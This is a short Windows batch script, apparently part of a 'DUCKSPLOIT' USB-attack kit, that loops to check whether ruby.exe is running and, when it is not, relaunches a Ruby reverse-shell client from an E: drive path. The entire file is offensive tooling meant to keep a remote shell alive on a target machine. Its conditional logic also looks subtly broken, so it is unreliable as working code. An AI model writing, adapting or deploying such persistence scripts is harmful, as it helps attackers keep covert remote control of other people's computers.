@echo off

mkdir C:\Temp


:loop


tasklist /FI "IMAGENAME eq ruby.exe" /FO CSV > C:\temp\search.log

FOR /F %%A IN (C:\Temp\search.log) DO IF %%~zA EQU 0 GOTO next else goto end


:next
ruby E:\DUCKSPLOIT\ruby\reverse_shell\client.rb


goto loop


:end